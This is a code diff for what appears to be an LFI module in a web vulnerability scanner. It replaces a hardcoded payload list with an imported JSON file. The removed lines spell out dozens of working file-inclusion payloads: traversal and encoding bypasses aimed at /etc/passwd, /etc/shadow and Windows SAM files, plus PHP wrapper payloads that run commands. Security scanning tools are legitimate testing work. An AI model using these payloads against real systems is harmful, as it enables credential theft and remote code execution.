@@ -1,6 +1,7 @@
 import { normalizeUrl } from './apiUtils';
 import { fetchWithBypass, CORSBypassMetadata } from './corsProxy';
 import { RequestManager } from './requestManager';
+import LFI_PAYLOADS_JSON from '@/payloads/lfi.json'; // Import JSON
 
 export interface LFIScanResult {
   vulnerable: boolean;
@@ -57,92 +58,15 @@ const LFI_ERROR_PATTERNS = [
   /expect:\/\//i,
 ];
 
-const LFI_PAYLOADS = [
-  // Basic traversal (Linux/Unix)
-  { payload: '../../../../../../../etc/passwd', type: 'Path Traversal (Unix)', severity: 'critical' as const, confidence: 0.98 },
-  { payload: '....//....//....//....//....//....//etc/passwd', type: 'Path Traversal (Bypass)', severity: 'critical' as const, confidence: 0.95 },
-  { payload: '..\\..\\..\\..\\..\\..\\..\\etc\\passwd', type: 'Path Traversal (Windows Style)', severity: 'high' as const, confidence: 0.85 },
-  
-  // Windows paths
-  { payload: '../../../../../../../windows/system32/drivers/etc/hosts', type: 'Path Traversal (Windows)', severity: 'critical' as const, confidence: 0.98 },
-  { payload: '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', type: 'Path Traversal (win.ini)', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'C:\\windows\\system32\\drivers\\etc\\hosts', type: 'Absolute Path (Windows)', severity: 'critical' as const, confidence: 0.98 },
-  
-  // Null byte injection (legacy PHP < 5.3)
-  { payload: '../../../../../../../etc/passwd%00', type: 'Null Byte Injection', severity: 'critical' as const, confidence: 0.9 },
-  { payload: '../../../../../../../etc/passwd%00.jpg', type: 'Null Byte + Extension', severity: 'critical' as const, confidence: 0.9 },
-  
-  // URL encoding evasion
-  { payload: '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', type: 'URL Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
-  { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', type: 'Double URL Encoded', severity: 'high' as const, confidence: 0.85 },
-  
-  // PHP wrappers
-  { payload: 'php://filter/convert.base64-encode/resource=index.php', type: 'PHP Filter Wrapper (Base64)', severity: 'critical' as const, confidence: 0.99 }, // Increased confidence
-  { payload: 'php://input', type: 'PHP Input Stream', severity: 'critical' as const, confidence: 0.95 },
-  { payload: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+', type: 'Data URI Wrapper', severity: 'critical' as const, confidence: 0.95 },
-  { payload: 'expect://id', type: 'Expect Wrapper (RCE)', severity: 'catastrophic' as const, confidence: 1.0 },
-  
-  // Log poisoning vectors
-  { payload: '/var/log/apache2/access.log', type: 'Apache Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '/var/log/nginx/access.log', type: 'Nginx Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '../../../../../../../proc/self/environ', type: 'Proc Environ', severity: 'high' as const, confidence: 0.9 },
-  { payload: '/proc/self/cmdline', type: 'Proc Cmdline', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '/proc/self/status', type: 'Proc Status', severity: 'medium' as const, confidence: 0.8 },
-  
-  // Config files
-  { payload: '../../../../../../../etc/php/7.4/apache2/php.ini', type: 'PHP Config Access', severity: 'high' as const, confidence: 0.9 },
-  { payload: '/etc/apache2/apache2.conf', type: 'Apache Config', severity: 'high' as const, confidence: 0.9 },
-  { payload: '/etc/nginx/nginx.conf', type: 'Nginx Config', severity: 'high' as const, confidence: 0.9 },
-  { payload: '/etc/shadow', type: 'Shadow File Access', severity: 'catastrophic' as const, confidence: 1.0 },
-  
-  // Advanced bypass techniques
-  { payload: '....//....//etc/passwd', type: 'Filter Bypass (Dot Slash)', severity: 'high' as const, confidence: 0.8 },
-  { payload: '..;/..;/..;/etc/passwd', type: 'Semicolon Bypass', severity: 'medium' as const, confidence: 0.75 },
-  
-  // Additional traversal depth
-  { payload: '../../../../../../../../../../etc/passwd', type: 'Deep Traversal', severity: 'critical' as const, confidence: 0.98 },
-  { payload: '..%252f..%252f..%252fetc%252fpasswd', type: 'Double Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'file:///etc/passwd', type: 'File URI Scheme', severity: 'critical' as const, confidence: 0.95 },
-  { payload: 'file:///C:/Windows/win.ini', type: 'File URI Scheme (Windows)', severity: 'critical' as const, confidence: 0.95 },
+interface LFIPayload {
+  payload: string;
+  type: string;
+  severity: 'critical' | 'high' | 'medium' | 'low' | 'catastrophic';
+  confidence: number;
+}
 
-  // --- Added Payloads ---
-  { payload: '../../../../../../../../../../../../etc/passwd', type: 'Deep Traversal (Extended)', severity: 'critical' as const, confidence: 0.98 },
-  { payload: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', type: 'Triple URL Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
-  { payload: '....//....//....//....//....//....//....//....//etc/passwd', type: 'Dot-Slash Bypass (Extended)', severity: 'critical' as const, confidence: 0.95 },
-  { payload: '/var/log/auth.log', type: 'Auth Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '/var/log/secure', type: 'Secure Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '/var/log/mail.log', type: 'Mail Log Access', severity: 'medium' as const, confidence: 0.75 },
-  { payload: '/var/log/vsftpd.log', type: 'FTP Log Access', severity: 'medium' as const, confidence: 0.75 },
-  { payload: '/var/log/sshd.log', type: 'SSH Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '/var/log/lastlog', type: 'Lastlog Access', severity: 'medium' as const, confidence: 0.7 },
-  { payload: '/var/log/wtmp', type: 'Wtmp Access', severity: 'medium' as const, confidence: 0.7 },
-  { payload: '/var/log/faillog', type: 'Faillog Access', severity: 'medium' as const, confidence: 0.7 },
-  { payload: '/proc/version', type: 'Proc Version', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '/proc/cmdline', type: 'Proc Cmdline', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '/proc/mounts', type: 'Proc Mounts', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '/proc/config.gz', type: 'Proc Config', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '/proc/cpuinfo', type: 'Proc CPU Info', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '/proc/self/fd/0', type: 'Proc FD 0', severity: 'low' as const, confidence: 0.6 },
-  { payload: '/proc/self/fd/1', type: 'Proc FD 1', severity: 'low' as const, confidence: 0.6 },
-  { payload: '/proc/self/fd/2', type: 'Proc FD 2', severity: 'low' as const, confidence: 0.6 },
-  { payload: '/proc/self/fd/3', type: 'Proc FD 3', severity: 'low' as const, confidence: 0.6 },
-  { payload: 'php://filter/read=string.rot13/resource=index.php', type: 'PHP Filter (ROT13)', severity: 'critical' as const, confidence: 0.99 },
-  { payload: 'php://filter/read=string.toupper/resource=index.php', type: 'PHP Filter (ToUpper)', severity: 'critical' as const, confidence: 0.99 },
-  { payload: 'php://filter/read=string.tolower/resource=index.php', type: 'PHP Filter (ToLower)', severity: 'critical' as const, confidence: 0.99 },
-  { payload: 'data:text/plain,<?php system(\'id\'); ?>', type: 'Data URI (RCE)', severity: 'catastrophic' as const, confidence: 1.0 },
-  { payload: 'zip://path/to/archive.zip%23file.txt', type: 'Zip Wrapper', severity: 'high' as const, confidence: 0.8 },
-  { payload: 'phar://path/to/archive.phar/file.txt', type: 'Phar Wrapper', severity: 'high' as const, confidence: 0.8 },
-  { payload: 'file:///etc/hosts', type: 'File URI (Hosts)', severity: 'critical' as const, confidence: 0.95 },
-  { payload: 'file:///proc/self/environ', type: 'File URI (Environ)', severity: 'critical' as const, confidence: 0.95 },
-  { payload: 'C:\\boot.ini', type: 'Windows Boot Config', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'C:\\inetpub\\wwwroot\\web.config', type: 'IIS Web Config', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'C:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf', type: 'Windows Apache Config', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'C:\\xampp\\apache\\conf\\httpd.conf', type: 'XAMPP Apache Config', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'C:\\wamp\\bin\\apache\\apache2.4.x\\conf\\httpd.conf', type: 'WAMP Apache Config', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'C:\\Windows\\repair\\sam', type: 'Windows SAM File', severity: 'catastrophic' as const, confidence: 1.0 },
-  { payload: 'C:\\Windows\\System32\\config\\RegBack\\SAM', type: 'Windows SAM Backup', severity: 'catastrophic' as const, confidence: 1.0 },
-  { payload: 'C:\\Windows\\System32\\config\\SAM', type: 'Windows SAM File', severity: 'catastrophic' as const, confidence: 1.0 },
-];
+// Use imported JSON payloads
+const LFI_PAYLOADS: LFIPayload[] = LFI_PAYLOADS_JSON as LFIPayload[];
 
 const checkLFISignature = (response: string): { found: boolean; pattern?: string; confidence: number } => {
   const lowerResponse = response.toLowerCase();
